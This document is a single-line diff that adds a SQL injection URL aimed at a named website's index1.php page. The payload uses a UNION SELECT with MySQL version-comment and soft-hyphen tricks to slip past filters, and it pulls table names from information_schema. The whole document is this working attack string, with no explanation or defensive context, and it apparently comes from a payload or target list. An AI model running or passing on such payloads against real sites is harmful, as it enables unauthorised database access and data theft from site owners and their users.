@@ -1,0 +1,1 @@
+krantitriofil.com/index1.php?id=-2+/*!50000UNION*/+/*!50000SELECT*/%C2%AD+1,2,3,group_concat(0x3c62723e,/*!12345unhex(hex(%60table_name%60))*/),5,6+/*!from*/+information_schema.tables+where+table_schema=database()--
